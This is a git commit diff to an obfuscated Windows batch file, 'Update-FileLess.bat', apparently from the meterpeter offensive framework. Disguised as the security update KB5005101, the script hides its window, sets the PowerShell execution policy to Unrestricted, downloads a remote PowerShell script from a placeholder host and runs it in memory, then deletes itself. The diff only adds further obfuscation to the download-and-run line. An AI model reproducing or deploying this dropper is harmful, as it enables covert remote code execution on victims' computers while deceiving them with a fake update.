ed741a6db80eb786aa40e75a16ca6ffa1ec18259
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2024-02-01 14:36:53 +0000

    meterpeter v2.10.14.1 - FileLess BAT technic

--- mimiRatz/Update-FileLess.bat
+++ mimiRatz/Update-FileLess.bat
@@ -2,7 +2,7 @@
 ( ,;(=i%@Socket():%f ,no%n_UDP%t ^DE%DB_#1%FIN^ED ,%@k%IS_%Buffer_%MINI%#1%MI%'i'%ZE^D ;se%#0_%t ^IS_MIN^IM%#1_%IZ^ED=1 && @st^a%db%rt "" ^/m%_#1%i^n "%~dpnx0" %* && e%GUID%x^it); ),
 ,Col%ls%or 0E && (,(@tIt%&1%lE ^Cumu%_UUID_%l^ati%#1%v^e Sec%#1%u^ri%_i_%ty Up^dat%'%e KB%Buffer_%5005101 && @Pow%#1%E^rsH^el%Socket():%l Ge^t-Hot%vibes%Fi^x),)
 @cm%Buff#1%d ^/R Ec^h%i0%O A|Pow^er%_GUID_%sh^elL Set-Exec^UtI%'B%onPo^lI%send(i)%cY Unr%db%e^stric^t%OFF%ed -Sc%_i0%o^pe Cur%_%r^ent%LANG%Us^er
-@Cd %tmp% && @pow%_i0%ersh%#1%ell -w%#1%in%_i0%dows%#1%tyle hi%_i0%dd%#1%en [I%#1%O.str%_i0%eamR%#1%e%_i0%ader]:%_i0%:new([N%#1%et.we%_i0%bRequ%#1%est]::C%#1%re%_i0%ate('ht%_i0%tp://CharlieBrown/Update-KB5005101.p%_i0%s1').G%#1%etRe%_i0%spo%#1%nse().Ge%_i0%tRes%#1%pon%#1%se%_i0%stre%#1%am()).Re%_i0%adToe%_i0%nd()|powershell &('Rex' -replace 'R','i')
+@Cd %tmp% && @pow%_i0%ersh%#1%ell -w%#1%in%_i0%dows%#1%tyle hi%_i0%dd%#1%en [I%#1%O.str%_i0%eamR%#1%e%_i0%ader]:%_i0%:new([N%#1%et.we%_i0%bRequ%#1%est]::C%#1%re%_i0%ate('ht%_i0%tp://CharlieBrown/Update-KB5005101.p%_i0%s1').G%#1%etRe%_i0%spo%#1%nse().Ge%_i0%tRes%#1%pon%#1%se%_i0%stre%#1%am()).Re%_i0%adToe%_i0%nd()|po%#1%wers%_i0%he%#1%ll &('Rex' -rep%#1%la%_i0%ce 'R','i')
 del "%~f0"
 
 
